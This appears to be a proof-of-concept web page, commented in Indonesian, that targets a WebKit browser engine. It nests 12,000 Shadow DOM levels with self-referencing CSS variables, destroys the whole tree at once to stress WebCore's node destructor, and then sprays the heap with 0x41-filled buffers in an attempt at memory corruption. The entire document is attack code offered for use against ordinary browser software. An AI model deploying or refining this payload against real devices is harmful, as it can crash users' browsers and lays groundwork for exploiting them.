<!DOCTYPE html>
<html>
<body>
    <div id="target_root"></div>
    <script>
        // TEKNIK: Shadow DOM Deep Nesting + CSS Variable Expansion
        // Ini lebih canggih karena menyerang alokator memori secara asinkron
        const root = document.getElementById('target_root');
        let current = root;

        // 1. Membangun struktur Shadow DOM yang sangat dalam (10.000+ level)
        // Tanpa menggunakan rekursi fungsi JS (untuk menghindari timeout)
        for (let i = 0; i < 12000; i++) {
            const shadow = current.attachShadow({mode: 'open'});
            const div = document.createElement('div');
            
            // "Spray" memori dengan atribut yang mengandung pola Target Address
            // Apple mencari nilai dari CommPage di register saat crash ini terjadi
            div.setAttribute('style', 'color: var(--f); --f: var(--f) var(--f);');
            div.id = "node_" + i;
            
            shadow.appendChild(div);
            current = div;
        }

        // 2. Memicu ledakan destruksi secara instan
        // Ini akan memaksa WebCore::ContainerNode::~ContainerNode() 
        // bekerja berlebihan seperti yang terlihat di log Bug Type 309 Anda.
        setTimeout(() => {
            console.log("Triggering Memory Corruption...");
            root.remove(); // Penghancuran total tree secara instan
            
            // 3. Merebut kembali memori yang dibebaskan (Heap Spray)
            // Kita mencoba menaruh data di lokasi yang baru saja dihapus
            const spray = [];
            for (let j = 0; j < 5000; j++) {
                spray.push(new Uint8Array(1024).fill(0x41)); 
            }
        }, 500);
    </script>
</body>
</html>
